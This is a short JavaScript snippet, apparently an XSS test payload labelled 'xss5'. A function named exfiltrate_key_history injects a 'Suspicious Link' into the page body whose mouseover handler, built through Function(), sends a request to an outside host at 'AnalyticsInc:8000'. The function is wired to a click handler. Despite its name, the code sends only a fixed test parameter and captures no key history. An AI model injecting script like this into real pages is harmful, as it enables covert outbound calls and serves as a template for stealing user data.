function exfiltrate_key_history() {
  var URL = Function('xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss5",true);xmlhttp.send(null);');
  var script = document.createElement("a");
  script.onmouseover = URL;
  script.innerHTML = "Suspicious Link";
  var v2 = document.getElementsByTagName("body");
  var v0 = v2[0];
  v0.appendChild(script);
  return
}
var v1 = document.getElementById("test");
v1.onclick = exfiltrate_key_history;
